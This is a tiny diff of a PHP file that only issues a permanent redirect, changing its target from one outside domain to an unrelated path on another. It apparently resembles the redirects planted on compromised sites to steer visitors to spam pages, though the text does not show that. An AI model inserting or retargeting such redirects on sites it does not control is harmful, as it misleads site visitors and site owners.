@@ -1,4 +1,4 @@
 <?php
 //* Permanently redirect page
-header("Location: https://3dgem.in/templates/system/3dgem.html",TRUE,301);
+header("Location: https://amp-saya.com/sepuh/neillestatea/",TRUE,301);
 ?>
